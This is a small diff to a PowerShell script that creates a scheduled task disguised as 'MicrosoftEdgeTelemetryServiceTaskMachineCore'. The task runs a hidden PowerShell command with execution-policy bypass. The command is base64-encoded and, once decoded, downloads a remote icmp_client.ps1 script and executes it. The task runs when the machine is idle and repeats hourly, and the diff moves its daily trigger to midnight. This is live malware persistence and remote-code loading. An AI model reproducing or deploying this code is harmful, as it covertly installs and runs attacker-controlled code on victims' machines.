@@ -3,7 +3,7 @@ if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -E
 }
 $ac = New-ScheduledTaskAction New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoLogo -NonInteractive -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA'
 $st = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -IdleDuration 00:02:00 -IdleWaitTimeout 23:00:00
-$tr = New-ScheduledTaskTrigger -Daily -At ((Get-Date).AddMinutes(5))
+$tr = New-ScheduledTaskTrigger -Daily -At 00:00
 $tr2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 1)
 
 $tr.Repetition = $tr2.Repetition
